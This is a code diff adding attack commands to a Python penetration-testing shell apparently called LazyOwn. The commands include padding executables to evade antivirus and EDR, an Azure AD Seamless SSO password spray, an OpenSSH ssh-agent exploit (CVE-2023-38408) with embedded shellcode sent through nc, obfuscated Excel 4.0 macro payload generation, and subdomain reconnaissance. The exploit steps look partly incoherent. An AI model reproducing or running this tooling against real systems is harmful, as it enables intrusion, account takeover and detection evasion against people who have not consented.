+        Workflow:
+            1. Determines the target domain from the `line` argument or defaults to `self.params["domain"]`.
+            2. Queries the crt.sh certificate transparency logs for subdomains using `curl`.
+            3. Filters and extracts domain-related text data using `pup`.
+            4. Sorts and removes duplicate entries, then validates subdomains with `httprobe`.
+            5. Saves the results to a temporary file.
+            6. Executes EyeWitness to generate a web-based reconnaissance report for the subdomains.
+
+        Requirements:
+            - `pup`: A command-line HTML parser.
+            - `httprobe`: A tool to check live HTTP/HTTPS endpoints.
+            - EyeWitness: A tool for generating web reconnaissance reports.
+
+        Parameters:
+            line (str): The domain to target for reconnaissance. If omitted, the domain defaults to `self.params["domain"]`.
+
+        Examples:
+            1. Specify a domain directly:
+                >>> recon domain.com
+
+            2. Use the default domain from self.params:
+                >>> recon
+        Raises:
+            None. Errors in execution will be logged or printed as part of the command output.
+
+        """
+        path = os.getcwd()
+        sessions = f"{path}/sessions"
+        eyewitness_path = os.path.join("external", ".exploit", "EyeWitness")
+        eyewitness_path = path + "/" + eyewitness_path        
+
+        if line:
+            domain = line.strip()
+        else:
+            domain = self.params["domain"]
+
+        command_eye = f"/usr/share/eyewitness/EyeWitness.py "
+        command = "domain={dom};curl -fsSL \"https://crt.sh/?q=${domain}\" | pup 'td text{}' | grep \"${domain}\" | sort -n | uniq | httprobe > {sessions}/enum_tmp_{dom}.txt;  {command_eye} -f {sessions}/enum_tmp_{dom}.txt --web".replace("{dom}", domain).replace("{command_eye}",command_eye).replace("{sessions}",sessions)
+
+        print_msg(command)
+        time.sleep(1)
+        os.system(command)
+        print_msg(command)
+        return
+    
+    def do_digdug(self, line):
+        """
+        Executes Dig Dug to inflate the size of an executable file, leveraging pre-configured settings 
+        and interactive input for minimal user effort.
+
+        This function integrates with the Dig Dug tool to increase an executable's size by appending 
+        dictionary words. It automates repository setup, selects the input file from user prompts or defaults, 
+        and uses sensible configurations to execute the inflation process. Dig Dug is particularly useful 
+        for evading AV/EDR detections by exceeding size thresholds for analysis.
+
+        Behavior:
+            - Automatically clones the Dig Dug repository if not already present in `external/.exploit/DigDug`.
+            - Calls the `venom` command to prepare the necessary payloads for execution.
+            - Prompts the user to select an input executable and specify the desired size increase.
+            - Uses a default dictionary (`google-10000-english-usa-gt5.txt`) for padding.
+
+        Requirements:
+            - A Python environment with required dependencies.
+            - Executable files available in the working directory or `sessions`.
+
+        Usage:
+            Invoke this function to inflate the size of a generated payload or user-specified executable.
+            Interactive prompts will guide the input selection and size configuration.
+
+        Examples:
+            1. Increase the size of a selected payload by 100 MB:
+                >>> digdug
+
+            2. Use the default configurations to inflate an executable:
+                No additional parameters are required. The user is prompted for size and file selection.
+        """
+        try:
+            digdug_repo = "https://github.com/RedSiege/DigDug.git"
+            digdug_path = os.path.join("external", ".exploit", "DigDug")
+            current_path = os.getcwd()
+            sessions = f"{current_path}/sessions"
+            digdug_full_path = f"{current_path}/{digdug_path}"
+
+            if not os.path.exists(digdug_path):
+                print_warn("Dig Dug not found. Installing...")
+                os.makedirs(digdug_path, exist_ok=True)
+                os.system(f"git clone {digdug_repo} {digdug_path}")
+                print_msg("Dig Dug installed successfully.")
+
+            self.onecmd('venom')
+
+            input_file = get_users_dic("exe")
+            size = input("    [!] Specify the desired size in megabytes to increase by default 100: ") or 100
+            dictionary = f"{digdug_full_path}/dictionaries/google-10000-english-usa-gt5.txt"
+            command = f"cd {sessions} && python3 {digdug_full_path}/digdug.py -i {input_file} -m {size}"
+            command += f" -d {dictionary}"
+            print_msg(f"Executing Dig Dug with command: {command}")
+            os.system(command)
+
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+    def do_adsso_spray(self, line):
+        """
+        Performs a password spray attack on Azure Active Directory Seamless Single Sign-On (SSO) using a specified list of users.
+
+        This function automates the process of spraying a given password across multiple user accounts in a target domain. It utilizes 
+        a user list in the form of a text file, targeting Azure AD Seamless SSO endpoints. The results are processed and saved to 
+        a specified output file, providing insights into which accounts were successful or failed during the attack.
+
+        Requirements:
+            - A valid domain and URL for the target Azure AD instance. (assing url https://url.com)
+            - A user dictionary file containing usernames (without the domain) to be sprayed.
+        
+        Parameters:
+            line (str): Command-line input passed to the function (not currently used in the function).
+
+        Behavior:
+            - Loads the domain and URL from the configuration stored in `self.params`.
+            - Reads the user list from a file specified in `get_users_dic`.
+            - Sprays the specified password to all users and processes the results.
+            - Saves the successful and failed attempts to the output file.
+
+        Example:
+            - Perform a password spray attack with the password "admin" and save the results:
+                >>> adsso_spray
+            - Customize the password or user list by modifying `self.params` before invoking the function.
+
+        """
+        domain = self.params["domain"]
+        url = self.params["url"]
+        users_dic = get_users_dic("txt")
+        path = os.getcwd()
+        sessions = f"{path}/sessions"
+        output_file = f"{sessions}/adsso_stpray_{domain}.txt"
+        password = input("    [!] Password to spray. Defaults to admin: ") or 'admin'
+        wait = input("    [!] Number of seconds to sleep between individual user attempts default 0: ") or '0'
+        users = []
+
+        for line in users_dic:
+            users.append(line.split('@')[0].strip())
+            
+
+        results = Spray(domain, users, password, url, wait, True, False)	
+        ProcessResults(results, output_file)        
+        return
+    
+    def do_creds_py(self, line):
+        """
+        Searches for default credentials associated with a specific product or vendor, using the Default Credentials Cheat Sheet.
+
+        This function automates the process of querying the Default Credentials Cheat Sheet for default credentials of various products.
+        It searches for the specified product or vendor, providing relevant default credentials for pentesters during engagements.
+
+        Behavior:
+            - Automatically clones the Default Credentials Cheat Sheet repository if not already present in `external/.exploit/DefaultCreds`.
+            - Executes a search command with the product/vendor specified by the user.
+            - Returns the default credentials for the requested product or vendor.
+
+        Requirements:
+            - Python environment with necessary dependencies.
+            - Access to the Default Credentials Cheat Sheet repository.
+
+        Usage:
+            Run this function to search for default credentials related to a product or vendor.
+            The user is prompted to enter the product/vendor for which they need credentials.
+
+        Examples:
+            1. Search for default credentials of 'tomcat':
+                >>> creds search tomcat
+        """
+        try:
+            creds_repo = "https://github.com/incredibleindishell/DefaultCreds-cheat-sheet.git"
+            path = os.getcwd()
+            creds_path = os.path.join("external", ".exploit", "DefaultCreds")
+            creds_path = f"{path}/{creds_path}"
+            if not os.path.exists(creds_path):
+                print_warn("Default Credentials Cheat Sheet not found. Installing...")
+                os.makedirs(creds_path, exist_ok=True)
+                os.system(f"git clone {creds_repo} {creds_path}")
+                os.system("pip install tinydb")
+                os.system("pip install prettytable")
+                os.system("pip install fire")
+                print_msg("Default Credentials Cheat Sheet installed successfully.")
+
+            product = line.strip()
+            if not product:
+                product = input("    [!] Please specify a product/vendor: ") or 'tomcat'
+
+
+            command = f"python3 {creds_path}/creds search {product}"
+            print_msg(f"Executing command: {command}")
+            os.system(command)
+
+        except Exception as e:
+            print_error(f"Error: {e}")
+
+    def do_sshexploit(self, line):
+        """
+        Exploits OpenSSH vulnerability CVE-2023-38408 via the PKCS#11 feature of the ssh-agent.
+
+        Steps:
+        1. Attacker connects via SSH to a target server.
+        2. Identify and export the SSH_AUTH_SOCK environment variable.
+        3. Send crafted shellcode to exploit the PKCS#11 vulnerability.
+        4. Load malicious libraries via ssh-add and trigger SIGSEGV for code execution.
+
+        Usage:
+            do_sshexploit
+
+        Example:
+            do_sshexploit
+
+        Note:
+            This function is for educational purposes only. Unauthorized exploitation is illegal.
+        """
+        try:
+
+            target_ip = self.params["rhost"]
+            lport = self.params["lport"]
+
+            print_msg("Step 1: Connecting to the target server...")
+            os.system(f"ssh {target_ip}")
+
+            print_msg("Step 2: Identifying and exporting SSH_AUTH_SOCK...")
+            ssh_sock = subprocess.getoutput("echo /tmp/ssh-*/agent.*")
+            if not ssh_sock:
+                print_error("Unable to identify SSH_AUTH_SOCK. Ensure ssh-agent is running.")
+                return
+            os.environ["SSH_AUTH_SOCK"] = ssh_sock
+            print_msg(f"SSH_AUTH_SOCK set to {ssh_sock}")
+
+            print_msg("Step 3: Adding malicious PKCS#11 stub...")
+            os.system("ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub")
+
+            print_msg("Step 4: Sending crafted shellcode...")
+            buf =  b""
+            buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
+            buf += b"\x05\xef\xff\xff\xff\x48\xbb\xa8\xf2\x2d\xd8\x8c"
+            buf += b"\x5c\x6a\xde\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
+            buf += b"\xff\xe2\xf4\xc2\xdb\x75\x41\xe6\x5e\x35\xb4\xa9"
+            buf += b"\xac\x22\xdd\xc4\xcb\x22\x67\xaa\xf2\x38\x6b\x86"
+            buf += b"\x56\x64\xd4\xf9\xba\xa4\x3e\xe6\x4c\x30\xb4\x82"
+            buf += b"\xaa\x22\xdd\xe6\x5f\x34\x96\x57\x3c\x47\xf9\xd4"
+            buf += b"\x53\x6f\xab\x5e\x98\x16\x80\x15\x14\xd1\xf1\xca"
+            buf += b"\x9b\x43\xf7\xff\x34\x6a\x8d\xe0\x7b\xca\x8a\xdb"
+            buf += b"\x14\xe3\x38\xa7\xf7\x2d\xd8\x8c\x5c\x6a\xde"
+            cmd = f'(perl -e \'print "\\0\\0\\x27\\xbf\\x14\\0\\0\\0\\x10/usr/lib/modules\\0\\0\\x27\\xa6" . "\\x90" x 10000\'; echo -n "{buf}") | nc -U "$SSH_AUTH_SOCK"'
+            os.system(cmd)
+
+            print_msg("Step 5: Uploading malicious libraries via ssh-add...")
+            libraries = [
+                "/usr/lib/titan/libttcn3-rt2-dynamic.so",
+                "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0",
+                "/usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0",
+            ]
+            for lib in libraries:
+                os.system(f"ssh-add -s {lib}")
+
+            print_msg("Step 6: Triggering SIGSEGV...")
+            os.system(f"nc localhost {lport}")
+
+            print_msg("Exploit completed. You now have access to the target user.")
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
+    
+    def do_tab(self, line):
+        """
+        Executes the `lazypyautogui.py` script with optional arguments.
+        This open new terminal tab and then run and instance of LazyOwn strokes the keyboard with pyautogui
+
+        If a `line` argument is provided, it appends the argument to the command.
+        Otherwise, it runs the script without additional parameters. The constructed
+        command is displayed and executed in the system shell.
+
+        Parameters:
+            line (str): Optional argument to pass as input to the `lazypyautogui.py` script.
+
+        Returns:
+            None
+        """        
+        if line:
+            command = f"python3 modules/lazypyautogui.py {line}"
+        else:
+            command = f"python3 modules/lazypyautogui.py"
+        print_msg(command)
+        os.system(command)
+        return
+
+    def do_excelntdonut(self, line):
+        """
+        Generates an Excel 4.0 (XLM) macro from a provided C# source file using EXCELntDonut.
+
+        This function:
+            - Installs EXCELntDonut dependencies if not already installed.
+            - Clones the EXCELntDonut repository if not present.
+            - Compiles the provided C# source file into shellcode.
+            - Generates the XLM macro and saves it to a specified output file.
+
+        Behavior:
+            - Requires `mono-complete` and `pip3` with required Python packages installed.
+            - Accepts parameters for input file, references, sandbox checks, obfuscation, and output file.
+            - Outputs the generated macro in a `.txt` or `.csv` format.
+
+        Usage:
+            excelntdonut -f <source_file.cs> -r <references> [--sandbox] [--obfuscate] [-o <output_file>]
+
+        Example:
+            excelntdonut -f payload.cs -r System.Windows.Forms.dll --sandbox --obfuscate -o macro.txt
+        """
+        path = os.getcwd()
+        repo_url = "https://github.com/RedSiege/EXCELntDonut.git"
+        repo_path = os.path.join(path, "external", ".exploit", "EXCELntDonut")
+        install_script = os.path.join(repo_path, "install.sh")
+        domain = self.params["domain"]
+        try:
+            if not os.path.exists(repo_path):
+                os.system(f"git clone {repo_url} {repo_path}")
+                os.system(f"chmod +x {install_script} && {install_script} && chmod +x {repo_path}/EXCELntDonut")
+
+            args = line.split()
+            input_file = get_users_dic("cs")
+            output_file = f"{path}/sessions/output_{domain}.txt"
+            references = input("    [!] Enter the References default (System.Management) : ") or 'System.Management'
+            sandbox = "--sandbox" 
+            obfuscate = "--obfuscate"
+            
+            if not input_file or not references:
+                raise ValueError("Input file (-f) and references (-r) are required.")
+
+            command = f"cd {repo_path}/EXCELntDonut && python3 -W ignore {repo_path}/EXCELntDonut/drive.py -f {input_file} -r '{references}'"
+            if sandbox:
+                command += " --sandbox"
+            if obfuscate:
+                command += " --obfuscate"
+            if output_file:
+                command += f" -o {output_file}"
+            print_msg(command)
+            os.system(command)
+
+        except Exception as e:
+            print_error(f"Error: {e}")
+        return
+
+
 
 if __name__ == "__main__":
     p = LazyOwnShell()
